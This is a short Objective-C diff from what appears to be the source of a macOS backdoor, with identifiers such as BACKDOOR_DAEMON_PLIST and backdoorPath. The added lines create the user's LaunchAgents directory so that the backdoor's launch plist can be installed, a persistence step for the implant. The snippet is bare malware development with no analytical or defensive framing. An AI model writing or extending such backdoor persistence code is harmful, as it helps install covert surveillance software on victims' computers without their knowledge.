@@ -326,6 +326,23 @@ static RCSMUtils *sharedUtils = nil;
   NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
                         NSHomeDirectory(),
                         BACKDOOR_DAEMON_PLIST];
+  NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
+           NSHomeDirectory()];
+
+  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
+    {
+#ifdef DEBUG_UTILS
+      warnLog(@"LaunchAgents path doesn't exists yet, creating");
+#endif
+
+      if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
+        {
+#ifdef DEBUG_UTILS
+          errorLog(@"Error mkdir LaunchAgents (%d)", errno);
+#endif
+          return NO;
+        }
+    }
   
   NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
   NSString *errorLog = [NSString stringWithFormat: @"%@/ji33", mBackdoorPath];
